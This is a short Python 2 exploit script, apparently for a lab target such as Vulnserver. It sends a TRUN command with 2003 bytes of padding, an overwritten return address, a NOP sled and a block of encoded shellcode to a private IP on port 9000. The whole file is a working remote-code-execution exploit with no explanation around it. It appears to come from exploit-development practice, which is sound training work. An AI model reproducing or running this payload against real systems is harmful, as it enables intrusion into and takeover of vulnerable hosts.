#!/usr/bin/python




import sys, socket

buff = "TRUN /.:/"

buff += "A" * 2003

buff += "\xAF\x11\x50\x62"

buff += "\x90" * 10

buff += b"\xbe\x7e\xdc\x8f\x82\xdb\xcc\xd9\x74\x24\xf4\x5d\x31"
buff += b"\xc9\xb1\x52\x31\x75\x12\x83\xc5\x04\x03\x0b\xd2\x6d"
buff += b"\x77\x0f\x02\xf3\x78\xef\xd3\x94\xf1\x0a\xe2\x94\x66"
buff += b"\x5f\x55\x25\xec\x0d\x5a\xce\xa0\xa5\xe9\xa2\x6c\xca"
buff += b"\x5a\x08\x4b\xe5\x5b\x21\xaf\x64\xd8\x38\xfc\x46\xe1"
buff += b"\xf2\xf1\x87\x26\xee\xf8\xd5\xff\x64\xae\xc9\x74\x30"
buff += b"\x73\x62\xc6\xd4\xf3\x97\x9f\xd7\xd2\x06\xab\x81\xf4"
buff += b"\xa9\x78\xba\xbc\xb1\x9d\x87\x77\x4a\x55\x73\x86\x9a"
buff += b"\xa7\x7c\x25\xe3\x07\x8f\x37\x24\xaf\x70\x42\x5c\xd3"
buff += b"\x0d\x55\x9b\xa9\xc9\xd0\x3f\x09\x99\x43\x9b\xab\x4e"
buff += b"\x15\x68\xa7\x3b\x51\x36\xa4\xba\xb6\x4d\xd0\x37\x39"
buff += b"\x81\x50\x03\x1e\x05\x38\xd7\x3f\x1c\xe4\xb6\x40\x7e"
buff += b"\x47\x66\xe5\xf5\x6a\x73\x94\x54\xe3\xb0\x95\x66\xf3"
buff += b"\xde\xae\x15\xc1\x41\x05\xb1\x69\x09\x83\x46\x8d\x20"
buff += b"\x73\xd8\x70\xcb\x84\xf1\xb6\x9f\xd4\x69\x1e\xa0\xbe"
buff += b"\x69\x9f\x75\x10\x39\x0f\x26\xd1\xe9\xef\x96\xb9\xe3"
buff += b"\xff\xc9\xda\x0c\x2a\x62\x70\xf7\xbd\x87\x8e\xfa\x29"
buff += b"\xf0\x92\x04\x56\xd2\x1a\xe2\x3c\xc2\x4a\xbd\xa8\x7b"
buff += b"\xd7\x35\x48\x83\xcd\x30\x4a\x0f\xe2\xc5\x05\xf8\x8f"
buff += b"\xd5\xf2\x08\xda\x87\x55\x16\xf0\xaf\x3a\x85\x9f\x2f"
buff += b"\x34\xb6\x37\x78\x11\x08\x4e\xec\x8f\x33\xf8\x12\x52"
buff += b"\xa5\xc3\x96\x89\x16\xcd\x17\x5f\x22\xe9\x07\x99\xab"
buff += b"\xb5\x73\x75\xfa\x63\x2d\x33\x54\xc2\x87\xed\x0b\x8c"
buff += b"\x4f\x6b\x60\x0f\x09\x74\xad\xf9\xf5\xc5\x18\xbc\x0a"
buff += b"\xe9\xcc\x48\x73\x17\x6d\xb6\xae\x93\x9d\xfd\xf2\xb2"
buff += b"\x35\x58\x67\x87\x5b\x5b\x52\xc4\x65\xd8\x56\xb5\x91"
buff += b"\xc0\x13\xb0\xde\x46\xc8\xc8\x4f\x23\xee\x7f\x6f\x66"


s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(('10.10.1.13',9000))

print s.recv(1024)

s.send(buff)

s.close()